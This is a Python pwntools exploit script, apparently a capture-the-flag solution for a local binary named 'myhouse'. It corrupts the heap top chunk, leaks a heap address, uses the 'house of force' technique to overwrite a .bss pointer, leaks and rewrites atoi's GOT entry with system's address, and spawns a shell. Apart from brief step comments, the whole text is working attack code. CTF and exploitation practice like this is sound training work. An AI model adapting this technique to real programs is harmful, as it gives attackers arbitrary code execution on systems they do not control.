from pwn import *
env=os.environ
#env['LD_PRELOAD']='./myhouse.so'
#context.log_level='debug'
libc=ELF('./myhouse.so')
r=process('./myhouse')
def addroom(size):
    r.recvuntil('Your choice:\n')
    r.sendline('1')
    r.recvuntil('What is the size of your room?')
    r.sendline(str(size))
def editroom(cont):
    r.recvuntil('Your choice:')
    r.sendline('2')
    r.recvuntil('shining!')
    r.send(cont)
def show():
    r.recvuntil('Your choice:')
    r.sendline('3')
#step 1:write '\x00' to main_arena's top_chunk pointer and set top's size
r.recvuntil('name?')
r.send('a'*0x20)
r.recvuntil('name of your house?')
r.send('b'*0xf8+p64(0xffffffffffffffff))
#gdb.attach(r)
r.recvuntil('size of your house?')
r.sendline(str(0x5c5b69))

r.recvuntil('Too large!')
r.sendline(str(0x200000))
r.recvuntil('Give me its description:')
r.send('c'*0x30)
#step 2:leak heap address
show()
r.recvuntil('a'*0x20)
heap=u64(r.recvline()[:-1].ljust(8,'\x00'))
print "heap:"+hex(heap)

#step 3:house of force
bssp=0x6020c0
addroom(bssp-(heap+0xf0)-0x20)
addroom(0x10)
gdb.attach(r)
#step 4:leak GOT and change GOT
got_atoi=0x602058
editroom(p64(got_atoi)+p64(got_atoi))
#gdb.attach(r)
show()
r.recvuntil('And description:\n')
atoi=u64(r.recvline()[:-1].ljust(8,'\x00'))
print "atoi:"+hex(atoi)
sys=atoi-libc.symbols['atoi']+libc.symbols['system']
editroom(p64(sys))
r.sendline('sh')
r.interactive()
